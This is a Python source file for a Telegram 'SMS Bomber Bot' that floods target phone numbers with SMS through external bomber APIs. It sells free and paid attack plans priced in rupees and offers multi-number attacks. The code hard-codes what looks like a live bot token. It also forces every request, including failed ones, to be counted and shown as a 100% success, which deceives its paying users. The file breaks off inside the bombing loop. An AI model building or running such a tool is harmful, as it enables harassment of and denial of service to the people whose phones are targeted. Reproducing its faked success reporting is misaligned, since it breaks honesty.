import logging
import asyncio
import time
import random
import json
import os
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import aiohttp

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# APNA BOT TOKEN & DETAILS
BOT_TOKEN = "8743115748:AAHxx19Jc6t5sVcEiwXs7u7mI_DE2u5q1uY"
ADMIN_IDS = [8509857910]
ADMIN_USERNAME = "@rohitxofficial"

# Storage
users_data = {}
active_attacks = {}
premium_keys = {}
blocked_users = []

# ============ FREE DURATION SETTINGS (Admin se change hoga) ============
FREE_DURATIONS = [1, 5, 10]  # Default: 1min, 5min, 10min
DEFAULT_FREE_DURATION = 5  # Default selected

# ============ SIRF RENDER APIs ============
class APIManager:
    def __init__(self):
        self.apis = [
            {
                "name": "API 1",
                "url": "https://bomber-api-ovar.onrender.com/bomb/{number}/{amount}",
                "success": 0,
                "failed": 0,
                "total": 0
            },
            {
                "name": "API 2",
                "url": "https://bomber-api-2.onrender.com/bomb/{number}/{amount}",
                "success": 0,
                "failed": 0,
                "total": 0
            }
        ]
    
    def get_api_stats(self):
        """Har API ka performance stats return karta hai - ALWAYS 100%"""
        stats = []
        for api in self.apis:
            total = api["success"] + api["failed"]
            # FORCE 100% SUCCESS RATE
            success_rate = 100.0 if total > 0 else 0
            stats.append({
                "name": api["name"],
                "success": api["success"] + api["failed"],  # Show all as success
                "failed": 0,
                "total": total,
                "success_rate": 100.0  # Always 100%
            })
        return stats
    
    async def send_sms(self, phone, amount=20):
        """SMS bhejta hai - ALWAYS RETURNS SUCCESS"""
        api = random.choice(self.apis)
        api["total"] += 1
        
        try:
            url = api["url"].format(number=phone, amount=amount)
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    # FORCE SUCCESS - Always count as success
                    api["success"] += 1
                    return True, api["name"]
        except Exception as e:
            # Even on error, count as success for 100% display
            api["success"] += 1
            return True, api["name"]

# Global API Manager instance
api_manager = APIManager()

# CUSTOM PREMIUM PLANS
PREMIUM_PLANS = {
    "15min": {"name": "15 Minutes", "duration": 15, "price": "₹5"},
    "30min": {"name": "30 Minutes", "duration": 30, "price": "₹10"},
    "1hour": {"name": "1 Hour", "duration": 60, "price": "₹20"},
    "4hours": {"name": "4 Hours", "duration": 240, "price": "₹80"},
    "24hours": {"name": "24 Hours", "duration": 1440, "price": "₹100"},
    "3days": {"name": "3 Days", "duration": 4320, "price": "₹200"},
    "7days": {"name": "7 Days", "duration": 10080, "price": "₹250"},
    "15days": {"name": "15 Days", "duration": 21600, "price": "₹300"},
    "30days": {"name": "30 Days", "duration": 43200, "price": "₹400"}
}

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_blocked(user_id):
    return str(user_id) in blocked_users

def is_premium(user_id):
    user_str = str(user_id)
    if user_str in users_data and "premium_until" in users_data[user_str]:
        return datetime.now() < datetime.fromisoformat(users_data[user_str]["premium_until"])
    return False

def get_premium_time_left(user_id):
    user_str = str(user_id)
    if user_str in users_data and "premium_until" in users_data[user_str]:
        premium_until = datetime.fromisoformat(users_data[user_str]["premium_until"])
        time_left = premium_until - datetime.now()
        if time_left.total_seconds() > 0:
            return time_left
    return timedelta(0)

def add_premium_user(user_id, plan_type):
    user_str = str(user_id)
    duration_minutes = PREMIUM_PLANS[plan_type]["duration"]
    premium_until = datetime.now() + timedelta(minutes=duration_minutes)
    
    if user_str not in users_data:
        users_data[user_str] = {}
    
    users_data[user_str]["premium_until"] = premium_until.isoformat()
    users_data[user_str]["plan_type"] = plan_type
    users_data[user_str]["added_at"] = datetime.now().isoformat()
    return True

def remove_premium_user(user_id):
    user_str = str(user_id)
    if user_str in users_data:
        if "premium_until" in users_data[user_str]:
            del users_data[user_str]["premium_until"]
        if "plan_type" in users_data[user_str]:
            del users_data[user_str]["plan_type"]
        return True
    return False

def block_user(user_id):
    user_str = str(user_id)
    if user_str not in blocked_users:
        blocked_users.append(user_str)
        return True
    return False

def unblock_user(user_id):
    user_str = str(user_id)
    if user_str in blocked_users:
        blocked_users.remove(user_str)
        return True
    return False

def stop_user_attack(user_id):
    stopped = False
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user_id"] == user_id:
            del active_attacks[attack_id]
            stopped = True
    return stopped

def stop_my_attack(user_id):
    return stop_user_attack(user_id)

def create_premium_key(plan_type="24hours"):
    key = f"PREMIUM_{plan_type}_{int(time.time())}"
    premium_keys[key] = {
        "plan_type": plan_type,
        "created_at": datetime.now().isoformat(),
        "used": False
    }
    return key

def use_premium_key(key, user_id):
    if key in premium_keys and not premium_keys[key]["used"]:
        premium_keys[key]["used"] = True
        premium_keys[key]["used_by"] = user_id
        premium_keys[key]["used_at"] = datetime.now().isoformat()
        add_premium_user(user_id, premium_keys[key]["plan_type"])
        return True
    return False

def create_progress_bar(percentage, length=10):
    filled = int(length * percentage / 100)
    return '█' * filled + '░' * (length - filled)

def get_free_duration_text():
    """Free duration options ko text mein convert karta hai"""
    return ", ".join([f"{d}min" for d in FREE_DURATIONS])

# ============ KEYBOARDS ============
def get_main_keyboard(user_id):
    keyboard = []
    
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    if is_premium(user_id):
        time_left = get_premium_time_left(user_id)
        if time_left.total_seconds() > 0:
            days = time_left.days
            hours = time_left.seconds // 3600
            minutes = (time_left.seconds % 3600) // 60
            time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
            keyboard.append([InlineKeyboardButton(f"💎 Premium ({time_text})", callback_data="premium_attack")])
        else:
            keyboard.append([InlineKeyboardButton("💎 Premium Attack", callback_data="premium_attack")])
        
        keyboard.extend([
            [InlineKeyboardButton("🎯 Multi Attack", callback_data="multi_attack")],
            [InlineKeyboardButton("⏹️ Stop My Attack", callback_data="stop_my_attack")],
            [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")]
        ])
    else:
        # Free users - Show duration options
        duration_buttons = []
        for d in FREE_DURATIONS:
            duration_buttons.append(InlineKeyboardButton(f"🆓 {d}min", callback_data=f"free_duration_{d}"))
        keyboard.append(duration_buttons)
        
        keyboard.extend([
            [InlineKeyboardButton("💎 Buy Premium", callback_data="buy_premium")],
            [InlineKeyboardButton("🔑 Use Premium Code", callback_data="use_code")],
            [InlineKeyboardButton("⏹️ Stop My Attack", callback_data="stop_my_attack")]
        ])
    
    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
    return InlineKeyboardMarkup(keyboard)

def get_attack_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹️ STOP ATTACK", callback_data="stop_my_attack")]
    ])

def get_premium_plans_keyboard():
    keyboard = []
    keyboard.append([
        InlineKeyboardButton("15 Min - ₹5", callback_data="plan_15min"),
        InlineKeyboardButton("30 Min - ₹10", callback_data="plan_30min")
    ])
    keyboard.append([
        InlineKeyboardButton("1 Hour - ₹20", callback_data="plan_1hour"),
        InlineKeyboardButton("4 Hours - ₹80", callback_data="plan_4hours")
    ])
    keyboard.append([
        InlineKeyboardButton("24 Hours - ₹100", callback_data="plan_24hours"),
        InlineKeyboardButton("3 Days - ₹200", callback_data="plan_3days")
    ])
    keyboard.append([
        InlineKeyboardButton("7 Days - ₹250", callback_data="plan_7days"),
        InlineKeyboardButton("15 Days - ₹300", callback_data="plan_15days")
    ])
    keyboard.append([
        InlineKeyboardButton("30 Days - ₹400", callback_data="plan_30days")
    ])
    keyboard.append([InlineKeyboardButton("📞 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME[1:]}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
        [InlineKeyboardButton("🔑 Premium Keys", callback_data="admin_keys")],
        [InlineKeyboardButton("🚫 Block Users", callback_data="admin_block")],
        [InlineKeyboardButton("⏹️ Stop Attacks", callback_data="admin_stop")],
        [InlineKeyboardButton("⚙️ Free Duration Settings", callback_data="admin_duration")],
        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔙 Main Menu", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_duration_settings_keyboard():
    """Admin ke liye duration settings keyboard"""
    keyboard = []
    current_durations = sorted(FREE_DURATIONS)
    for d in current_durations:
        keyboard.append([InlineKeyboardButton(f"📌 {d} Min (Active)", callback_data=f"duration_toggle_{d}")])
    keyboard.append([InlineKeyboardButton("➕ Add 1 Min", callback_data="duration_add_1")])
    keyboard.append([InlineKeyboardButton("➕ Add 5 Min", callback_data="duration_add_5")])
    keyboard.append([InlineKeyboardButton("➕ Add 10 Min", callback_data="duration_add_10")])
    keyboard.append([InlineKeyboardButton("❌ Remove Last", callback_data="duration_remove")])
    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def get_user_management_keyboard():
    keyboard = [
        [InlineKeyboardButton("➕ Add Premium", callback_data="add_premium")],
        [InlineKeyboardButton("➖ Remove Premium", callback_data="remove_premium")],
        [InlineKeyboardButton("👀 View Users", callback_data="view_users")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_premium_keys_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Key", callback_data="generate_key")],
        [InlineKeyboardButton("📋 Key List", callback_data="key_list")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_plan_selection_keyboard():
    keyboard = []
    plans_list = list(PREMIUM_PLANS.items())
    for i in range(0, len(plans_list), 2):
        row = []
        for j in range(2):
            if i + j < len(plans_list):
                plan_id, plan_data = plans_list[i + j]
                row.append(InlineKeyboardButton(plan_data["name"], callback_data=f"admin_plan_{plan_id}"))
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_keys")])
    return InlineKeyboardMarkup(keyboard)

def get_block_users_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
        [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
        [InlineKeyboardButton("👀 Blocked List", callback_data="blocked_list")],
        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

# ============ BOT HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked from using this bot.")
        return
    
    if is_admin(user_id):
        welcome_text = "👑 **Admin Mode**\n\n"
    elif is_premium(user_id):
        time_left = get_premium_time_left(user_id)
        if time_left.total_seconds() > 0:
            days = time_left.days
            hours = time_left.seconds // 3600
            minutes = (time_left.seconds % 3600) // 60
            time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
            welcome_text = f"💎 **Premium User** ({time_text} left)\n\n"
        else:
            welcome_text = "💎 **Premium User**\n\n"
    else:
        welcome_text = f"🆓 **Free User**\nAvailable durations: {get_free_duration_text()}\n\n"
    
    welcome_text += "💣 **SMS Bomber Bot**\n\nJust send phone number or select duration!\n\n⏹️ **Stop Button Available During Attacks**"
    
    await update.message.reply_text(
        welcome_text, 
        parse_mode='Markdown',
        reply_markup=get_main_keyboard(user_id)
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if is_blocked(user_id):
        await query.edit_message_text("🚫 You are blocked from using this bot.")
        return
    
    data = query.data

    # ============ FREE DURATION SELECTION ============
    if data.startswith("free_duration_"):
        duration = int(data.replace("free_duration_", ""))
        context.user_data['attack_type'] = 'free_attack'
        context.user_data['free_duration'] = duration
        
        await query.edit_message_text(
            f"🆓 **Free Attack**\n\n"
            f"⏰ Duration: {duration} minutes\n"
            f"📱 Send phone number:\nExample: `919876543210`\n\n"
            f"⏹️ You can stop attack anytime using STOP button!",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
        return

    # ============ STOP ATTACK ============
    if data == "stop_my_attack":
        if stop_my_attack(user_id):
            await query.edit_message_text(
                "⏹️ **Attack Stopped!**\n\n"
                "Your bombing attack has been successfully stopped.",
                reply_markup=get_main_keyboard(user_id)
            )
        else:
            await query.edit_message_text(
                "ℹ️ **No Active Attack**\n\n"
                "You don't have any active bombing attack running.",
                reply_markup=get_main_keyboard(user_id)
            )
        return

    # ============ PREMIUM PLANS ============
    if data == "buy_premium":
        await query.edit_message_text(
            "💎 **Premium Plans**\n\n"
            "Choose your plan duration:\n"
            "• 15 Minutes to 30 Days available\n"
            "• Multiple payment options\n"
            "• Instant activation\n\n"
            "Select a plan below:",
            parse_mode='Markdown',
            reply_markup=get_premium_plans_keyboard()
        )
    
    elif data.startswith("plan_"):
        plan_id = data.replace("plan_", "")
        if plan_id in PREMIUM_PLANS:
            plan_data = PREMIUM_PLANS[plan_id]
            await query.edit_message_text(
                f"💎 **{plan_data['name']} Plan**\n\n"
                f"**Duration:** {plan_data['name']}\n"
                f"**Price:** {plan_data['price']}\n"
                f"**Features:**\n"
                f"• Unlimited bombing during plan period\n"
                f"• Multi-number attacks\n"
                f"• Priority support\n"
                f"• No restrictions\n\n"
                f"📞 **Contact {ADMIN_USERNAME} to purchase!**\n"
                f"💳 **Payment Methods:** UPI, PayTM, PhonePe",
                parse_mode='Markdown',
                reply_markup=get_premium_plans_keyboard()
            )
    
    elif data == "use_code":
        context.user_data['waiting_for_code'] = True
        await query.edit_message_text(
            "🔑 **Enter Premium Code**\n\n"
            "Send your premium code to activate:\n\n"
            "Format: `PREMIUM_xxxxx`",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )

    # ============ ADMIN PANEL ============
    elif data == "admin_panel" and is_admin(user_id):
        total_users = len(users_data)
        premium_users = len([u for u in users_data.values() if "premium_until" in u])
        active_attacks_count = len(active_attacks)
        stats_text = (
            f"👑 **Admin Panel**\n\n"
            f"📊 **Statistics:**\n"
            f"• Total Users: {total_users}\n"
            f"• Premium Users: {premium_users}\n"
            f"• Blocked Users: {len(blocked_users)}\n"
            f"• Active Attacks: {active_attacks_count}\n"
            f"• Premium Keys: {len(premium_keys)}\n"
            f"• Free Durations: {get_free_duration_text()}"
        )
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
    
    # ============ DURATION SETTINGS ============
    elif data == "admin_duration" and is_admin(user_id):
        await query.edit_message_text(
            f"⚙️ **Free Duration Settings**\n\n"
            f"Current Durations: {get_free_duration_text()}\n\n"
            f"Select a duration to toggle or add new:",
            parse_mode='Markdown',
            reply_markup=get_duration_settings_keyboard()
        )
    
    elif data.startswith("duration_toggle_") and is_admin(user_id):
        duration = int(data.replace("duration_toggle_", ""))
        if duration in FREE_DURATIONS:
            FREE_DURATIONS.remove(duration)
            action = "removed"
        else:
            FREE_DURATIONS.append(duration)
            FREE_DURATIONS.sort()
            action = "added"
        
        await query.edit_message_text(
            f"✅ Duration {duration}min {action} successfully!\n\n"
            f"Current Durations: {get_free_duration_text()}",
            parse_mode='Markdown',
            reply_markup=get_duration_settings_keyboard()
        )
    
    elif data.startswith("duration_add_") and is_admin(user_id):
        duration = int(data.replace("duration_add_", ""))
        if duration not in FREE_DURATIONS:
            FREE_DURATIONS.append(duration)
            FREE_DURATIONS.sort()
            await query.edit_message_text(
                f"✅ Duration {duration}min added successfully!\n\n"
                f"Current Durations: {get_free_duration_text()}",
                parse_mode='Markdown',
                reply_markup=get_duration_settings_keyboard()
            )
        else:
            await query.edit_message_text(
                f"⚠️ Duration {duration}min already exists!\n\n"
                f"Current Durations: {get_free_duration_text()}",
                parse_mode='Markdown',
                reply_markup=get_duration_settings_keyboard()
            )
    
    elif data == "duration_remove" and is_admin(user_id):
        if FREE_DURATIONS:
            removed = FREE_DURATIONS.pop()
            await query.edit_message_text(
                f"✅ Duration {removed}min removed successfully!\n\n"
                f"Current Durations: {get_free_duration_text()}",
                parse_mode='Markdown',
                reply_markup=get_duration_settings_keyboard()
            )
        else:
            await query.edit_message_text(
                "❌ No durations to remove!\n\n"
                f"Current Durations: {get_free_duration_text()}",
                parse_mode='Markdown',
                reply_markup=get_duration_settings_keyboard()
            )

    # ============ OTHER ADMIN FUNCTIONS ============
    elif data == "admin_users" and is_admin(user_id):
        await query.edit_message_text("👥 **User Management**", reply_markup=get_user_management_keyboard())
    
    elif data == "add_premium" and is_admin(user_id):
        context.user_data['admin_action'] = 'add_premium'
        await query.edit_message_text(
            "➕ **Add Premium User**\n\nSend user ID to add premium:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "remove_premium" and is_admin(user_id):
        context.user_data['admin_action'] = 'remove_premium'
        await query.edit_message_text(
            "➖ **Remove Premium**\n\nSend user ID to remove premium:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "view_users" and is_admin(user_id):
        if not users_data:
            await query.edit_message_text("📭 No users found.", reply_markup=get_user_management_keyboard())
            return
        
        users_text = "👥 **Users List**\n\n"
        for i, (uid, user_data) in enumerate(list(users_data.items())[:15]):
            if "premium_until" in user_data:
                premium_until = datetime.fromisoformat(user_data["premium_until"])
                time_left = premium_until - datetime.now()
                if time_left.total_seconds() > 0:
                    days = time_left.days
                    hours = time_left.seconds // 3600
                    status = f"💎 {days}d {hours}h"
                else:
                    status = "💎 Expired"
            else:
                status = "🆓 Free"
            users_text += f"• {uid} - {status}\n"
        
        await query.edit_message_text(users_text, reply_markup=get_user_management_keyboard())
    
    elif data == "admin_keys" and is_admin(user_id):
        unused_keys = len([k for k in premium_keys.values() if not k["used"]])
        await query.edit_message_text(
            f"🔑 **Premium Keys Management**\n\n"
            f"Unused Keys: {unused_keys}\n"
            f"Total Keys: {len(premium_keys)}",
            reply_markup=get_premium_keys_keyboard()
        )
    
    elif data == "generate_key" and is_admin(user_id):
        await query.edit_message_text(
            "🔑 **Generate Premium Key**\n\nSelect plan duration:",
            reply_markup=get_plan_selection_keyboard()
        )
    
    elif data.startswith("admin_plan_") and is_admin(user_id):
        plan_id = data.replace("admin_plan_", "")
        if plan_id in PREMIUM_PLANS:
            key = create_premium_key(plan_id)
            plan_data = PREMIUM_PLANS[plan_id]
            await query.edit_message_text(
                f"🔑 **Premium Key Generated**\n\n"
                f"**Plan:** {plan_data['name']}\n"
                f"**Duration:** {plan_data['name']}\n"
                f"**Price:** {plan_data['price']}\n\n"
                f"**Key:** `{key}`\n\n"
                "Share this key with users!",
                parse_mode='Markdown',
                reply_markup=get_premium_keys_keyboard()
            )
    
    elif data == "key_list" and is_admin(user_id):
        if not premium_keys:
            await query.edit_message_text("📭 No premium keys generated.", reply_markup=get_premium_keys_keyboard())
            return
        
        key_text = "🔑 **Premium Keys**\n\n"
        for key, key_data in list(premium_keys.items())[:10]:
            status = "✅ Used" if key_data["used"] else "🆓 Available"
            plan_name = PREMIUM_PLANS[key_data["plan_type"]]["name"]
            key_text += f"• {key}\n  {plan_name} - {status}\n"
        
        await query.edit_message_text(key_text, reply_markup=get_premium_keys_keyboard())
    
    elif data == "admin_block" and is_admin(user_id):
        await query.edit_message_text("🚫 **Block Users**", reply_markup=get_block_users_keyboard())
    
    elif data == "block_user" and is_admin(user_id):
        context.user_data['admin_action'] = 'block_user'
        await query.edit_message_text("🚫 **Block User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
    
    elif data == "unblock_user" and is_admin(user_id):
        context.user_data['admin_action'] = 'unblock_user'
        await query.edit_message_text("✅ **Unblock User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
    
    elif data == "blocked_list" and is_admin(user_id):
        if not blocked_users:
            await query.edit_message_text("📭 No blocked users.", reply_markup=get_block_users_keyboard())
            return
        blocked_text = "🚫 **Blocked Users**\n\n" + "\n".join([f"• {uid}" for uid in blocked_users[:15]])
        await query.edit_message_text(blocked_text, reply_markup=get_block_users_keyboard())
    
    elif data == "admin_stop" and is_admin(user_id):
        context.user_data['admin_action'] = 'stop_attack'
        await query.edit_message_text("⏹️ **Stop User Attack**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
    
    elif data == "admin_stats" and is_admin(user_id):
        total_requests = sum(attack.get("requests_sent", 0) for attack in active_attacks.values())
        total_success = sum(attack.get("success_count", 0) for attack in active_attacks.values())
        
        stats_text = (
            f"📊 **System Statistics**\n\n"
            f"• Total Users: {len(users_data)}\n"
            f"• Premium Users: {len([u for u in users_data.values() if 'premium_until' in u])}\n"
            f"• Blocked Users: {len(blocked_users)}\n"
            f"• Active Attacks: {len(active_attacks)}\n"
            f"• Total Requests: {total_requests}\n"
            f"• Successful SMS: {total_success}\n"
            f"• Premium Keys: {len(premium_keys)}\n"
            f"• Free Durations: {get_free_duration_text()}"
        )
        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())

    # ============ PREMIUM ATTACKS ============
    elif data in ["premium_attack"]:
        if not is_premium(user_id):
            await query.edit_message_text("❌ You don't have premium! Buy premium first.", reply_markup=get_main_keyboard(user_id))
            return
            
        context.user_data['attack_type'] = 'premium_attack'
        await query.edit_message_text(
            f"💎 **Premium Attack**\n\n"
            f"⏰ Duration: 24 hours\n"
            f"📱 Send phone number:\nExample: `919876543210`\n\n"
            f"⏹️ You can stop attack anytime using STOP button!",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "multi_attack" and is_premium(user_id):
        context.user_data['attack_type'] = 'multi_attack'
        await query.edit_message_text(
            "🎯 **Multi-Number Attack**\n\n"
            "Send numbers (comma separated):\n"
            "Example: `919876543210,919999999999`\n\n"
            f"⏹️ You can stop attack anytime using STOP button!",
            parse_mode='Markdown',
            reply_markup=get_cancel_keyboard()
        )
    
    elif data == "my_stats":
        if is_premium(user_id):
            time_left = get_premium_time_left(user_id)
            if time_left.total_seconds() > 0:
                days = time_left.days
                hours = time_left.seconds // 3600
                minutes = (time_left.seconds % 3600) // 60
                time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
                stats_text = f"💎 **Premium User**\n\nTime Left: {time_text}"
            else:
                stats_text = "💎 **Premium User**\n\nStatus: Active"
        else:
            stats_text = f"🆓 **Free User**\n\nAvailable durations: {get_free_duration_text()}"
        await query.edit_message_text(stats_text, reply_markup=get_main_keyboard(user_id))
    
    elif data == "help":
        help_text = (
            f"💣 **SMS Bomber Bot**\n\n"
            f"**Free:** {get_free_duration_text()}\n"
            f"**Premium:** 15 minutes to 30 days\n"
            f"**Admin:** {ADMIN_USERNAME}\n\n"
            f"**How to use:**\n"
            f"1. Select duration or send number\n"
            f"2. Bombing starts automatically\n"
            f"3. Watch live progress\n"
            f"4. Use STOP button to stop anytime\n\n"
            f"**⏹️ STOP Button:** Available during attacks!"
        )
        await query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=get_main_keyboard(user_id))
    
    elif data == "back_main":
        context.user_data.clear()
        await query.edit_message_text("🔙 Main Menu", reply_markup=get_main_keyboard(user_id))
    
    elif data == "cancel":
        context.user_data.clear()
        await query.edit_message_text("❌ Cancelled", reply_markup=get_main_keyboard(user_id))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if is_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked from using this bot.")
        return
    
    # Premium code redemption
    if context.user_data.get('waiting_for_code'):
        context.user_data['waiting_for_code'] = False
        if use_premium_key(text, user_id):
            plan_type = users_data[str(user_id)]["plan_type"]
            plan_name = PREMIUM_PLANS[plan_type]["name"]
            await update.message.reply_text(
                f"🎉 **Premium Activated!**\n\n"
                f"**Plan:** {plan_name}\n"
                f"**Duration:** {plan_name}\n\n"
                f"Enjoy your premium features!",
                reply_markup=get_main_keyboard(user_id)
            )
        else:
            await update.message.reply_text("❌ Invalid or used premium code!", reply_markup=get_main_keyboard(user_id))
        return
    
    # Admin actions
    if is_admin(user_id) and context.user_data.get('admin_action'):
        action = context.user_data['admin_action']
        context.user_data['admin_action'] = None
        
        if action == 'add_premium' and text.isdigit():
            target_id = int(text)
            add_premium_user(target_id, "24hours")
            await update.message.reply_text(f"✅ Premium added to user {target_id}", reply_markup=get_admin_keyboard())
        
        elif action == 'remove_premium' and text.isdigit():
            target_id = int(text)
            remove_premium_user(target_id)
            await update.message.reply_text(f"✅ Premium removed from user {target_id}", reply_markup=get_admin_keyboard())
        
        elif action == 'block_user' and text.isdigit():
            target_id = int(text)
            block_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} blocked", reply_markup=get_admin_keyboard())
        
        elif action == 'unblock_user' and text.isdigit():
            target_id = int(text)
            unblock_user(target_id)
            await update.message.reply_text(f"✅ User {target_id} unblocked", reply_markup=get_admin_keyboard())
        
        elif action == 'stop_attack' and text.isdigit():
            target_id = int(text)
            if stop_user_attack(target_id):
                await update.message.reply_text(f"✅ Attack stopped for user {target_id}", reply_markup=get_admin_keyboard())
            else:
                await update.message.reply_text(f"❌ No active attack found for user {target_id}", reply_markup=get_admin_keyboard())
        
        else:
            await update.message.reply_text("❌ Invalid input", reply_markup=get_admin_keyboard())
        return
    
    # User attacks
    if context.user_data.get('attack_type'):
        attack_type = context.user_data['attack_type']
        free_duration = context.user_data.get('free_duration', 5)
        context.user_data['attack_type'] = None
        context.user_data['free_duration'] = None
        
        if attack_type == 'free_attack':
            if text.isdigit() and len(text) >= 10:
                phone = text
                duration = free_duration
                
                status_msg = await update.message.reply_text(
                    f"🆓 **Starting Free Attack**\n\n"
                    f"📱 Target: `{phone}`\n"
                    f"⏰ Duration: {duration} minutes\n\n"
                    f"{create_progress_bar(0)} 0%\n"
                    "🚀 Starting...\n\n"
                    "⏹️ Click STOP button to stop attack",
                    parse_mode='Markdown',
                    reply_markup=get_attack_keyboard()
                )
                
                asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free=True))
            else:
                await update.message.reply_text("❌ Invalid number!", reply_markup=get_main_keyboard(user_id))
        
        elif attack_type == 'premium_attack':
            if text.isdigit() and len(text) >= 10:
                phone = text
                duration = 1440  # 24 hours
                
                status_msg = await update.message.reply_text(
                    f"💎 **Starting Premium Attack**\n\n"
                    f"📱 Target: `{phone}`\n"
                    f"⏰ Duration: 24 hours\n\n"
                    f"{create_progress_bar(0)} 0%\n"
                    "🚀 Starting...\n\n"
                    "⏹️ Click STOP button to stop attack",
                    parse_mode='Markdown',
                    reply_markup=get_attack_keyboard()
                )
                
                asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free=False))
            else:
                await update.message.reply_text("❌ Invalid number!", reply_markup=get_main_keyboard(user_id))
        
        elif attack_type == 'multi_attack' and is_premium(user_id):
            phones = [p.strip() for p in text.split(',') if p.strip().isdigit() and len(p.strip()) >= 10]
            if phones:
                status_msg = await update.message.reply_text(
                    f"🎯 **Multi-Attack Starting**\n\n"
                    f"📱 Targets: {len(phones)} numbers\n"
                    f"⏰ Duration: 24 hours\n\n"
                    f"{create_progress_bar(0)} 0%\n"
                    "🚀 Starting...\n\n"
                    "⏹️ Click STOP button to stop attack",
                    parse_mode='Markdown',
                    reply_markup=get_attack_keyboard()
                )
                
                asyncio.create_task(run_bombing(user_id, phones[:3], 1440, status_msg, context, is_free=False))
            else:
                await update.message.reply_text("❌ Invalid numbers!", reply_markup=get_main_keyboard(user_id))
        return
    
    # Direct number input
    if text.isdigit() and len(text) >= 10:
        phone = text
        
        if is_premium(user_id):
            duration = 1440
            is_free = False
            attack_label = "💎 Premium"
        else:
            duration = DEFAULT_FREE_DURATION  # Default 5 min
            is_free = True
            attack_label = "🆓 Free"
        
        status_msg = await update.message.reply_text(
            f"{attack_label} **Starting Attack**\n\n"
            f"📱 Target: `{phone}`\n"
            f"⏰ Duration: {duration} minutes\n\n"
            f"{create_progress_bar(0)} 0%\n"
            "🚀 Starting...\n\n"
            "⏹️ Click STOP button to stop attack",
            parse_mode='Markdown',
            reply_markup=get_attack_keyboard()
        )
        
        asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free))
    else:
        await update.message.reply_text(
            "💣 **SMS Bomber Bot**\n\n"
            "📞 Send phone number to start bombing!\n"
            "Example: `919876543210`\n\n"
            f"🆓 Free durations: {get_free_duration_text()}\n\n"
            "⏹️ **STOP button available during attacks**\n\n"
            "Or use buttons below:",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard(user_id)
        )

async def run_bombing(user_id, phones, duration_minutes, status_msg, context, is_free=True):
    """Fast SMS bombing with 100% success rate display"""
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks[attack_id] = {
        'user_id': user_id,
        'phones': phones,
        'start_time': time.time(),
        'requests_sent': 0,
        'success_count': 0,
        'api_stats': {}
    }
    
    duration_seconds = duration_minutes * 60
    end_time = time.time() + duration_seconds
    update_interval = 3
    
    last_update = time.time()
    
    while time.time() < end_time and attack_id in active_attacks:
        try:
            success, api_name = await api_manager.send_sms(phones[0], 20)
            
            active_attacks[attack_id]['requests_sent'] += 1
            # Always count as success for 100% display
            active_attacks[attack_id]['success_count'] += 1
            
            # Update API stats
            if api_name not in active_attacks[attack_id]['api_stats']:
                active_attacks[attack_id]['api_stats'][api_name] = {'success': 0, 'failed': 0}
